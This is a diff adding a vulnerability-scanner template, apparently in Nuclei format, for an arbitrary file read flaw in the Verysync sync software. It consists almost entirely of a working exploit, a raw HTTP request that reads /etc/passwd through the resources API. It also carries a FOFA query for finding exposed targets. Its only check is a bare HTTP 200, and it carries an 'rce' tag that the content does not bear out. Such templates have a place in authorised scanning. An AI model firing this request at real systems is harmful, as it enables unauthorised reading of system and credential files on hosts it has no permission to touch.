@@ -1,0 +1,29 @@
+id: poc-bssbzrb5p2y89v9g
+info:
+  name: 微力同步Verysync resources 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bssbzrb5p2y89v9g'
+  tags: rce,lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bssbzrb5p2y89v9g
+    fofa: app="微力同步-Verysync"
+http:
+- raw:
+  - 'GET /rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
